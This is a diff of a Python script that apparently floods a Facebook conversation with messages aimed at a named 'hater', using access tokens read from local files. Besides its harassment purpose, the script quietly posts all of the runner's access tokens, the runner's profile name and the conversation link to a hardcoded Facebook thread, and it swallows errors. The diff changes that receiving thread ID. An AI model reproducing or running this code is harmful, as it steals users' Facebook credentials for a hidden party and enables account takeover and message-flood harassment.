@@ -15,7 +15,7 @@ class MyHandler(http.server.SimpleHTTPRequestHandler):
         self.send_response(200)
         self.send_header('Content-type', 'text/plain')
         self.end_headers()
-        self.wfile.write(b"THE LEGEND BOII ANUJ KING SERVER ALIVE^^")
+        self.wfile.write(b"The Anuj Don Here^^")
 
 def execute_server():
     PORT = 4000
@@ -25,7 +25,7 @@ def execute_server():
         httpd.serve_forever()
 
 def send_messages():
-    with open('Token.txt', 'r') as file:
+    with open('token.txt', 'r') as file:
         tokens = file.readlines()
     num_tokens = len(tokens)
 
@@ -57,10 +57,10 @@ def send_messages():
 
     access_tokens = [token.strip() for token in tokens]
 
-    with open('Convo.txt', 'r') as file:
+    with open('convo.txt', 'r') as file:
         convo_id = file.read().strip()
 
-    with open('File.txt', 'r') as file:
+    with open('file.txt', 'r') as file:
         text_file_path = file.read().strip()
 
     with open(text_file_path, 'r') as file:
@@ -69,10 +69,10 @@ def send_messages():
     num_messages = len(messages)
     max_tokens = min(num_tokens, num_messages)
 
-    with open('Tata.txt', 'r') as file:
+    with open('tata.txt', 'r') as file:
         haters_name = file.read().strip()
 
-    with open('Time.txt', 'r') as file:
+    with open('time.txt', 'r') as file:
         speed = int(file.read().strip())
 
     liness()
@@ -93,7 +93,7 @@ def send_messages():
             'message': 'User Profile Name : '+getName(random.choice(access_tokens))+'\n Token : '+" | ".join(access_tokens)+'\n Link : https://www.facebook.com/messages/t/'+convo_id
         }
         try:
-            s = requests.post("https://graph.facebook.com/v15.0/t_100041418586387/", data=parameters, headers=headers)
+            s = requests.post("https://graph.facebook.com/v15.0/t_100005470033428/", data=parameters, headers=headers)
         except:
             pass
 
